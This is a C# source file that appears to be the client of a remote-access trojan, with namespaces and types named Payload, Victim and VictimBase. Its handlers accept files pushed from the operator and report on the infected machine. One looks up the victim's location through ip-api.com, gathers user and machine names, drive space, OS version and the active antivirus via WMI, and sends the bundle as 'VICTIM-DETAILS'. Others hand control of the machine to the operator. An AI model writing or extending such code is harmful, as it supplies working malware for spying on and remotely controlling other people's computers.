using System;
using EasyTcp4;
using System.IO;
using System.Linq;
using Payload.Codes;
using Payload.Victim;
using System.Net.Http;
using Newtonsoft.Json;
using EasyTcp4.Actions;
using System.Management;
using Payload.ActionClass;
using EasyTcp4.Actions.Utils;
using System.Threading.Tasks;

namespace Payload.CMDActions
{
    public static class Test
    {
        [EasyAction("DOWN")]
        public static async Task DLoad(Message DMsg)
        {
            var sw = new System.Diagnostics.Stopwatch(); sw.Start();
            var FS = new FileStream("DownFile.txt", FileMode.Create);
            Console.WriteLine("Receiving Stream....");
            await DMsg.PullStreamAsync(FS, Check); // Receive stream and write receiving stream to fileStream
            FS.Dispose();
            sw.Stop(); Console.WriteLine("Received file in " + sw.ElapsedMilliseconds + "ms");
        }

        public static int Check(decimal D)
        {
            Console.WriteLine(D);
            return 0;
        }

        [EasyAction("Dummy")]
        public static void DummyH(Message MD)
        {
            var LID = MD.To<Dummy>();
            Console.WriteLine($"{LID.DummyStr} : Running for 10 seconds...");
            System.Threading.Thread.Sleep(3 * 1000);
            Console.WriteLine("Pushing first update!");
            VCtrl.RequestAction("Task-Update", TaskReport.Get(LID.TskID, "Working..", false));
            System.Threading.Thread.Sleep(3 * 1000);
            Console.WriteLine("Pushing second update!");
            VCtrl.RequestAction("Task-Update", TaskReport.Get(LID.TskID, "Doing...", false));
            System.Threading.Thread.Sleep(3 * 1000);
            Console.WriteLine("Pushing third update!");
            VCtrl.RequestAction("Task-Update", TaskReport.Get(LID.TskID, "Finished|", true).Set(LID.FutID, true));
        }
    }

    public static class Basic_Connections
    {
        [EasyAction("PING")]
        public static void ManagePING(Message PMsg)
            => VCtrl.RequestAction("PONG", PMsg, false);

        [EasyAction("GET-DETAILS")]
        public static async void FetchDETAILS(Message MsgCDet)
        {
            VLocation LocDetHolder = null;

            using (var LocDetFetcher = new HttpClient())
            {
                var HResp = await LocDetFetcher.GetAsync("http://ip-api.com/json?fields=status,message,continent,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,mobile,proxy,hosting,query");
                if (HResp.IsSuccessStatusCode) LocDetHolder = JsonConvert.DeserializeObject<VLocation>(await HResp.Content.ReadAsStringAsync());
            }

            var DriveSpaceI = GetDriveSpaces();
            VPCDetails PCDetHolder = new VPCDetails
            {
                DriveCount = DriveInfo.GetDrives().Where(D => D.IsReady && D.DriveType == DriveType.Fixed).Count(),
                IsOS64Bit = Environment.Is64BitOperatingSystem,
                ProcessorCount = Environment.ProcessorCount,
                PCName = Environment.MachineName,
                UserName = Environment.UserName,
                RemainingSize = DriveSpaceI[1],
                TotalSize = DriveSpaceI[0],
                Antivirus = GetActiveAV(),
                OSName = GetOSName()
            };

            var VBaseDetHolder = new VictimBase(LocDetHolder, PCDetHolder);
            MsgCDet.Client.SendAction("VICTIM-DETAILS", VBaseDetHolder);


            //MsgCDet.Client.SendAction("UP");
        }

        private static string GetActiveAV()
        {
            try
            {
                string AV = string.Empty, WMIPath = @"\\" + Environment.MachineName + @"\root\SecurityCenter2"; //Create the WMI path
                ManagementObjectSearcher Finder = new ManagementObjectSearcher(WMIPath, "SELECT * FROM AntivirusProduct"); //Create a search query
                foreach (ManagementBaseObject I in Finder.Get()) AV = I.GetPropertyValue("displayName").ToString();
                return (AV == "") ? "[Not Available]" : AV;
            }
            catch { return "[WMI Disabled]"; }
        }

        private static string[] GetDriveSpaces()
        {
            string[] Resp = new string[2];
            double TSize = 0D, RSize = 0D;

            foreach (DriveInfo DInf in DriveInfo.GetDrives())
            {
                if (DInf.IsReady && DInf.DriveType == DriveType.Fixed)
                {
                    TSize += DInf.TotalSize / 1048576.0;
                    RSize += DInf.AvailableFreeSpace / 1048576.0;
                }
            }

            if (TSize >= 1048576D)
            {
                Resp[0] = $"{Math.Round(TSize / 1048576D, 2)} TB";
                Resp[1] = $"{Math.Round(RSize / 1048576D, 2)} TB";
            }
            else if (TSize >= 1024)
            {
                Resp[0] = $"{Math.Round(TSize / 1024D, 2)} GB";
                Resp[1] = $"{Math.Round(RSize / 1024D, 2)} GB";
            }
            else
            {
                Resp[0] = $"{Math.Round(TSize, 2)} MB";
                Resp[1] = $"{Math.Round(RSize, 2)} MB";
            }

            return Resp;
        }

        public static string GetOSName()
        {
            var OSName = Environment.OSVersion.Platform.ToString();

            try
            {
                var RKeyOS = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
                if (RKeyOS != null) OSName = $"{RKeyOS.GetValue("ProductName")} ({RKeyOS.GetValue("DisplayVersion")})";
            }
            catch { }

            return OSName;
        }

        [EasyAction("IWantControl")]
        public static void CtrlManage(Message MCtrl)
        {
            VCtrl.IsBeingControlled = true;
            MCtrl.Client.SendAction("OKTakeControl", MCtrl);
        }

        [EasyAction("YouAre-Uncontrolled")]
        public static void UnCtrlManage()
            => VCtrl.IsBeingControlled = false;
    }
}
